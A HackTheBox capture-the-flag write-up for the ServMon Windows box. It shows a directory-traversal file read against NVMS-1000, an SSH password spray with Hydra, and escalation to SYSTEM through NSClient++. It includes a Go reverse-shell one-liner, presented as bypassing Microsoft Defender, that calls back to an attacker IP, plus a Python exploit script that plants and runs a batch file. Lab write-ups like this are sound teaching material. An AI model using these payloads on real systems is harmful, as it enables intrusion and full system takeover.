---
render_with_liquid: false
title: HackTheBox Writeup  ServMon
date: 2023-12-22 19:55:38 +1400
tags: [hackthebox, nmap, windows, netexec, ftp, lftp, discover-notes, nvms-1000, directory-traversal, cve-2019-20085, brute-force-attack, hydra, nsclient, nscp, port-forwarding, defense-evasion, av-bypass, revshell-go, oscp-like-2023, ffuf]
---



ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user&amp;amp;#039;s desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it&amp;amp;#039;s possible enumerate the system and find the password for `NSClient++` (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of `NT AUTHORITY\SYSTEM`. Users have been given permissions to restart the `NSCP` service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ pt init '10.129.227.77 ServMon'
+---------+--------+---------------+---------+
| PROFILE | STATUS |      IP       | DOMAIN  |
+---------+--------+---------------+---------+
| servmon | on     | 10.129.227.77 | ServMon |
+---------+--------+---------------+---------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Dec 22 19:55:37 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77
Nmap scan report for 10.129.227.77
Host is up, received user-set (0.40s latency).
Scanned at 2023-12-22 19:55:38 CST for 170s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZWUiZm0zoIEvjMl+ZFTe7UqziszU3tF8v8YeguZ5yGcWwkuJCCOROdiXt37INiwgFnRaiIGKg4hYzMcGrhQT/QVx53KZPNJHGuTl18yTlXFvQZjgPk1Bc/0JGw9C1Dx9abLs1zC03S4/sFepnECbfnTXzm28nNbd+VI3UUe5rjlnC4TrRLUMAtl8ybD2LA2919qGTT1HjUf8h73sGWdY9rrfMg4omua3ywkQOaoV/KWJZVQvChAYINM2D33wJJjngppp8aPgY/1RfVVXh/asAZJD49AhTU+1HSvBHO6K9/Bh6p0xWgVXhjuEd0KUyCwRqkvWAjxw5xrCCokjYcOEZ34fA+IkwPpK4oQE279/Y5p7niZyP4lFVl5cu0J9TfWUcavL44neyyNHNSJPOLSMHGgGs10GsfjqCdX0ggjhxc0RqWa9oZZtlVtsIV5WR6MyRsUPTV6N8NRDD8=
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA5iE0EIBy2ljOhQ42zqa843noU8K42IIHcRa9tFu5kUtlUcQ9CghqmRG7yrLjEBxJBMeZ3DRL3xEXH0K5rCRGY=
|   256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7yYxNJoV/1Lp8AQeOGoJrtQ6rgTitX0ksHDoKjhn
80/tcp    open  http          syn-ack ttl 127
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5666/tcp  open  tcpwrapped    syn-ack ttl 127
6063/tcp  open  x11?          syn-ack ttl 127
6699/tcp  open  napster?      syn-ack ttl 127
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
| SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
....
SF:h:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38851/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32591/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35106/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44902/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-12-22T11:58:21
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 17s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Dec 22 19:58:28 2023 -- 1 IP address (1 host up) scanned in 170.25 seconds
```


## 445 - SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ nxc smb 10.129.227.77 -u '' -p ''
SMB         10.129.227.77   445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.227.77   445    SERVMON          [-] ServMon\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ nxc smb 10.129.227.77 -u 'a' -p ''
SMB         10.129.227.77   445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.227.77   445    SERVMON          [-] ServMon\a: STATUS_LOGON_FAILURE
```

## 80 - Site : NVMS-1000


### Info

> servmon/Pages/login.htm

![](/assets/obsidian/f9f97c23f70ee7074d3b180b11d65307.png)


## 8443 - Site : NSClient++


### Info

> https://servmon:8443/index.html

![](/assets/obsidian/1e69c2a9717848adb1951d165a734872.png)

# User Flag
---

## Enumeration


### 21 - FTP


#### Anonymous login

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ ftp ftp://anonymous:''@Servmon
Connected to ServMon.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> ls -la
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.
```

#### Dump files

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ mkdir -p loot/ftp && cd loot/ftp

┌──(bravosec㉿fsociety)-[~/htb/ServMon/loot/ftp]
└─$ lftp servmon -u anonymous, -e 'set ftp:list-options -a; mirror . . --parallel=40 --only-newer --size-range=0-30M'
Total: 3 directories, 2 files, 0 symlinks
New: 2 files, 0 symlinks
350 bytes transferred in 6 seconds (60 B/s)
lftp anonymous@servmon:/>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon/loot/ftp]
└─$ find . -type f -ls
  3639981      4 -rw-r--r--   1 bravosec kali          182 Mar  1  2022 ./Users/Nathan/Notes\ to\ do.txt
  3639982      4 -rw-r--r--   1 bravosec kali          168 Mar  1  2022 ./Users/Nadine/Confidential.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon/loot/ftp]
└─$ cat ./Users/Nathan/Notes\ to\ do.txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                                                                                                                          
┌──(bravosec㉿fsociety)-[~/htb/ServMon/loot/ftp]
└─$ cat ./Users/Nadine/Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine 
```

> `I left your Passwords.txt file on your Desktop` = Directory traversal, Arbitrary File Read or LFI (Experience of CTFs)


## Shell as Nadine


### TVT NVMS 1000 - Directory Traversal (CVE-2019-20085)

Google : `NVMS-1000 exploit`

> https://www.exploit-db.com/exploits/48311

Validated

> http://servmon/../../../../../../../../../../../../WINDOWS/System32/drivers/etc/hosts

![](/assets/obsidian/6530465915569c613fbd2244338c166a.png)

Get `Passwords.txt` from `Nathan`'s desktop

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ curl --path-as-is 'http://servmon/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt' | tee Nathan_pass.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   156  100   156    0     0    173      0 --:--:-- --:--:-- --:--:--   173
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$ 
```

### Password spray SSH

Spray the passwords for 2 users

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ cat users.lst
Nathan
Nadine
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ hydra -e nsr -L users.lst -P Nathan_pass.txt ssh://servmon -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-22 20:34:40
[DATA] max 4 tasks per 1 server, overall 4 tasks, 20 login tries (l:2/p:10), ~5 tries per task
[DATA] attacking ssh://servmon:22/
[22][ssh] host: servmon   login: Nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-22 20:34:52
```

### SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ cssh Nadine@servmon 'L1k3B1gBut7s@W0rk'

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
424d8bed124bb35cfac2a6fb34409d05
```


# Root Flag
---

## From Nadine to NT Authority SYSTEM


### Enumeration

```bash
nadine@SERVMON C:\Users\Nadine>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Nadine>
```

```bash
PS C:\Users\Nadine> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
servmon\nadine S-1-5-21-3217154428-562821044-1828981534-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

PS C:\Users\Nadine> net user

User accounts for \\SERVMON

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Nadine                   Nathan                   WDAGUtilityAccount
The command completed successfully.

PS C:\Users\Nadine> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

PS C:\Users\Nadine>
```

### NSClient++ 0.5.2.35 - Privilege Escalation


#### Foothold

According to the tips, next step should be abusing **Nsclient**

I know **Nsclient++** is opened on port `8443`, but only accessible from localhost

#### Get version of nsclient++

`NSClient++` was in `\Program Files`

```bash
PS C:\> ls -Force ".\Program Files\"


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/1/2022   1:20 AM                Common Files
d-----       11/11/2019   6:52 PM                internet explorer
d-----        2/28/2022   6:07 PM                MSBuild
d-----        2/28/2022   6:55 PM                NSClient++
d-----        2/28/2022   6:46 PM                NVMS-1000
d-----        2/28/2022   6:32 PM                OpenSSH-Win64
d-----        2/28/2022   6:07 PM                Reference Assemblies
d--h--         3/1/2022   1:18 AM                Uninstall Information
d-----        2/28/2022   5:44 PM                VMware
d-r---       11/11/2019   6:52 PM                Windows Defender
d-----       11/11/2019   6:52 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----       11/11/2019   6:52 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----       11/11/2019   6:52 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d--hs-        9/15/2018  12:19 AM                Windows Sidebar
d--h--        9/15/2018  12:19 AM                WindowsApps
d-----        2/28/2022   6:25 PM                WindowsPowerShell
-a-hs-        9/15/2018  12:16 AM            174 desktop.ini


PS C:\>
```

`nscp.exe` is the main program

```bash
PS C:\> cd ".\Program Files\NSClient++\"
PS C:\Program Files\NSClient++> ls -Force


    Directory: C:\Program Files\NSClient++


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/28/2022   6:55 PM                crash-dumps
d-----        2/28/2022   6:55 PM                modules
d-----        2/28/2022   6:55 PM                scripts
d-----        2/28/2022   6:55 PM                security
d-----        2/28/2022   6:55 PM                web
-a----        12/9/2015  12:17 AM          28672 boost_chrono-vc110-mt-1_58.dll
-a----        12/9/2015  12:17 AM          50688 boost_date_time-vc110-mt-1_58.dll
-a----        12/9/2015  12:17 AM         117760 boost_filesystem-vc110-mt-1_58.dll
-a----        12/9/2015  12:22 AM         439296 boost_program_options-vc110-mt-1_58.dll
-a----        12/9/2015  12:23 AM         256000 boost_python-vc110-mt-1_58.dll
-a----        12/9/2015  12:17 AM         765952 boost_regex-vc110-mt-1_58.dll
-a----        12/9/2015  12:16 AM          19456 boost_system-vc110-mt-1_58.dll
-a----        12/9/2015  12:18 AM         102400 boost_thread-vc110-mt-1_58.dll
-a----        1/14/2020   1:24 PM             51 boot.ini
-a----        1/18/2018   3:51 PM         157453 changelog.txt
-a----        1/28/2018  10:33 PM        1210392 check_nrpe.exe
-a----        11/5/2017   9:09 PM         318464 Google.ProtocolBuffers.dll
-a----        12/8/2015  11:16 PM        1655808 libeay32.dll
-a----        11/5/2017  10:04 PM          18351 license.txt
-a----        10/5/2017   7:19 AM         203264 lua.dll
-a----        4/10/2020   6:32 PM           2683 nsclient.ini
-a----       12/22/2023   8:08 AM          40817 nsclient.log
-a----        11/5/2017   9:42 PM          55808 NSCP.Core.dll
-a----        1/28/2018  10:32 PM        4765208 nscp.exe
-a----        11/5/2017   9:42 PM         483328 NSCP.Protobuf.dll
-a----       11/19/2017   4:18 PM         534016 nscp_json_pb.dll
-a----       11/19/2017   3:55 PM        2090496 nscp_lua_pb.dll
-a----        1/23/2018   8:57 PM         507904 nscp_mongoose.dll
-a----       11/19/2017   3:49 PM        2658304 nscp_protobuf.dll
-a----        11/5/2017  10:04 PM           3921 old-settings.map
-a----        1/28/2018  10:21 PM        1973760 plugin_api.dll
-a----        5/23/2015   8:44 AM        3017216 python27.dll
-a----        9/27/2015   3:42 PM       28923515 python27.zip
-a----        1/28/2018  10:34 PM         384536 reporter.exe
-a----        12/8/2015  11:16 PM         348160 ssleay32.dll
-a----        5/23/2015   8:44 AM         689664 unicodedata.pyd
-a----        11/5/2017   9:20 PM        1273856 where_filter.dll
-a----        5/23/2015   8:44 AM          47616 _socket.pyd
```

Get version from its metadata

```bash
PS C:\Program Files\NSClient++> ls .\nscp.exe | fl *


PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\NSClient++\nscp.exe
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\NSClient++
PSChildName       : nscp.exe
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : False
Mode              : -a----
VersionInfo       : File:             C:\Program Files\NSClient++\nscp.exe
                    InternalName:     NSCP
                    OriginalFilename: NSCP.EXE
                    FileVersion:      0.5.2.35
                    FileDescription:  Monitoring Agent
                    Product:          NSClient++
                    ProductVersion:   0.5.2.35
[...]
```


#### How it works

Google : `nsclient 0.5.2.35 exploit`

> https://www.exploit-db.com/exploits/46802

After getting administrator password from `C:\Program Files\NSClient++\nsclient.ini` 

I will be able to login **NSClient++** web interface as admin,

I can create a script, then setup a schedule task to run the script as **SYSTEM**

#### Exploit

1. Grab web administrator password

```powershell
PS C:\Program Files\NSClient++> cat .\nsclient.ini

# If you want to fill this file with all available options run the following command:

#   nscp settings --generate --add-defaults --load-all

# If you want to activate a module and bring in all its options use:

#   nscp settings --activate-module <MODULE NAME> --add-defaults

# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
[...]
```

2. Port forward `8443` to our localhost

```bash
cssh Nadine@servmon 'L1k3B1gBut7s@W0rk' -L 8443:127.0.0.1:8443
```

3. Login to **nsclient** and make sure both `CheckExternalScripts` and `Scheduler` modules are enabled

> https://127.0.0.1:8443/index.html#/modules

![](/assets/obsidian/3d03b95cb42d4780e81b75f25f6bdc12.png)

![](/assets/obsidian/46655b4b1038d4aa12725603a59fdc60.png)

4. Upload our go reverse shell that **bypasses microsoft defender**

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.16.30:1111");cmd:=exec.Command("powershell");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > rev.go ; GOOS=windows GOARCH=amd64 go build rev.go
```

^8bd3e2

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ scp rev.exe Nadine@servmon:'/programdata/'
Nadine@servmon's password:
rev.exe                                                               100% 2671KB 894.4KB/s   00:02
```

5. The rest is a pain to do manually, used an exploit script instead

> https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation

> `exploit.py`

```python

#!/usr/bin/python3

#automated way of exploiting vulnerabale NSClient++ 0.5.2.35 for privilege escalation.

#original exploit: https://www.exploit-db.com/exploits/46802
import requests
import argparse


parser = argparse.ArgumentParser(description='NSClient++ 0.5.2.35 - Privilege Escalation Script')
parser.add_argument('command', help='command to execute on victim machine')
parser.add_argument('host', help='host + port of the target. For example: https://192.168.0.100:443')
parser.add_argument('password', help='password for the user of the application')

args = parser.parse_args()

response = requests.put(args.host+'/api/v1/scripts/ext/scripts/exploit1.bat', data=args.command, verify=False, auth=('admin', args.password))
print(response)
response = requests.get(args.host+'/api/v1/queries/exploit1/commands/execute?time=1m', verify=False, auth=('admin', args.password))
print(response)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon/exploit/NSClient-0.5.2.35---Privilege-Escalation]
└─$ python exploit.py 'C:\programdata\rev.exe' https://127.0.0.1:8443 'ew2x6SsGTxjRwXOT'
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1062: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
<Response [200]>
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1062: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
<Response [200]>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/ServMon]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.227.77] 51244
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Program Files\NSClient++> whoami
whoami
nt authority\system
PS C:\Program Files\NSClient++> cat \users\administrator\desktop\root.txt
cat \users\administrator\desktop\root.txt
7bc5835b3a4d8fecb47d25521902d637
PS C:\Program Files\NSClient++>
```


# Additional
---

## Fuzz Directory Traversal with dotdotpwn

`dotdotpwn` works for both Linux and Windows, and can be used for bypasses

```bash
ffuf -c -request-proto http -u 'http://servmon/FUZZ' -w /usr/share/payloadsallthethings/Directory\ Traversal/Intruder/dotdotpwn.txt -fs 0
```

![](/assets/obsidian/7ecdead949133066843c581d878fdaa6.png)